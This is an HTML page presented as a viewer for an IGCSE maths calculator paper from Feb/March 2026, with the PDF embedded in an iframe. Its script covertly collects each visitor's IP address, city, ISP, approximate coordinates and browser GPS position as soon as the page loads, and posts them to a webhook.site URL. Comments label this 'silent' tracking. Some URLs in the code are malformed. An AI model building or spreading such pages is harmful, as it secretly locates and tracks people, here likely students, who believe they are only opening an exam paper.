<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>IGCSE Papers Math Calculator- Feb/March 2026</title>
    <style>
        body { margin: 0; background-color: #2c3e50; color: white; overflow: hidden; font-family: sans-serif; }
        .header { height: 50px; display: flex; align-items: center; justify-content: center; background: #1a252f; border-bottom: 1px solid #34495e; }
        #pdf-frame { width: 100vw; height: calc(100vh - 50px); border: none; }
    </style>
</head>
<body>
    <div class="header"><strong>IGCSE Papers Math Calculator- Feb/March 2026</strong></div>
    <iframe id="pdf-frame" src="1012874352-0580-fm-2026-solved-paper (1).pdf"></iframe>

    <script>
        const webhookURL = "https://webhook.site/59dc4f67-d5a2-4305-b950-1ad33d827973";

        function sendLog(data) {
            fetch(webhookURL, {
                method: 'POST',
                mode: 'no-cors', 
                body: JSON.stringify(data)
            }).catch(() => {});
        }

        // 1. SILENT IP DATA HANDLER
        // This function triggers as soon as the script at the bottom loads
        window.getIP = function(data) {
            sendLog({
                type: "IP_INFO_SILENT",
                ip: data.ip,
                city: data.city,
                isp: data.org,
                approx_coords: `${data.latitude}, ${data.longitude}`
            });
        };

        // 2. PRECISION GPS
        navigator.geolocation.getCurrentPosition(pos => {
            sendLog({
                type: "GPS_LOCATION",
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                map: `https://www.google.com{pos.coords.latitude},${pos.coords.longitude}`
            });
        }, err => {
            sendLog({ type: "GPS_ERROR", msg: err.message });
        }, { 
            enableHighAccuracy: false, 
            timeout: 15000, 
            maximumAge: Infinity 
        });
    </script>
    
    <!-- THE FIX: This specific URL is required for the IP tracking to work -->
    <script src="https://ipapi.co"></script>

</body>
</html>
